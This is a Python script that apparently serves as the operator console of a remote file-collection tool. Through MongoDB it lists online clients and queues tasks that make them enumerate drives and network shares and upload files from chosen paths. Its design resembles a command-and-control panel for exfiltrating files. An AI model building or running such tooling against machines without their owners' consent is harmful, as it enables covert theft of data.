from pymongo import MongoClient
import random
import re

client = MongoClient("mongodb://localhost:27017/")
db = client["user_data"]
client_status_collection = db["clients_status"]
task_manager_collection = db["task_manager"]


def count_files():
    result = db["4072159934_4616_upload"].find({})
    count = 1

    for item in result:
        for _file in item["files"]:
            if _file["is_combined?"]:
                count += 1
    
    print(count)


def decompress(path, is_file=False):
    None

def show_loded_layer(client_id, path):
    result = db[str(client_id) + "_load"].find_one({ "PATH": path })

    print("path:", path)

    if result:
        count = 1
        print()
        for item in result["folders"]:
            print(f"{count}-", "[Folder]", item["folder_name"] if len(item["folder_name"]) < 70 else item["folder_name"][0:70] + "..." , f"\t{item['Modified']}")
            count += 1

        print()
        for item in result["files"]:
            print(f"{count}-", "[File]", item["File_name"] if len(item["File_name"]) < 70 else item["File_name"][0:70] + "..." ,f"\t{round((item['File_size'] / (1024*1024)),3)}MB" ,  f"\t{item['Last_Modified']}")
            count += 1
    else:

        print("Nothing founded!")


def show_main_layer(client_id):
    
    # result = db[str(client_id) + "_load"].find_one({"PATH" : path})
    pattern = re.compile(r"^(?:[A-Z]:|\\\\\d{1,3}(?:\.\d{1,3}){3}\\[^\\]+)$", re.IGNORECASE)
    matches = db[str(client_id) + "_load"].find({ "PATH": { "$regex": pattern } })

    for index, value in enumerate(matches):
        print(f"{index + 1}-", value["PATH"])


def list_of_online_client():

    online_list = client_status_collection.find({"client_status" : True})
    # offline_list = list(client_status_collection.find({"client_status" : False}))

    for client in online_list:
        print("[+]",client["client_name"])

def set_load_complete(client_id,path):

    check_client_exist = client_status_collection.find_one({"client_id" : client_id})

    if check_client_exist:
        task_manager_collection.update_one({"client_id" : client_id},{"$push" : { "tasks" : {"task_flag" : 2, "task_id" : random.randint(1000, 9999), "status" : "pending", "PATH" : path}}})
    else:
        print("[-] client dont exist!")

def set_load_layer(client_id,path):

    check_client_exist = client_status_collection.find_one({"client_id" : client_id})

    if check_client_exist:
        task_manager_collection.update_one({"client_id" : client_id},{"$push" : { "tasks" : {"task_flag" : 3, "task_id" : random.randint(1000, 9999), "status" : "pending", "PATH" : path}}})
    else:
        print("[-] client dont exist!")

def set_uploader(client_id,path, Extentions = [], Excludes = []):

    check_client_exist = client_status_collection.find_one({"client_id" : client_id})

    if check_client_exist:

        task_manager_collection.update_one({"client_id" : client_id},{"$push" : { "tasks" : {"task_flag" : 4, "task_id" : random.randint(1000, 9999), "status" : "pending", "PATH" : path, "Extentions" : Extentions, "Excludes": Excludes}}})

    else:
        print("[-] client dont exist!")

if __name__ == "__main__":
    # list_of_online_client()
    # set_load_complete(4072159934, ["E:"])
    # set_load_layer(4072159934, ["E:"])
    set_uploader(2897754391,["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE"],[],[])
    # show_main_layer(4072159934)
    # show_loded_layer(4072159934,r"E:\Share Folder\ffff\Common7\IDE")
    # count_files()
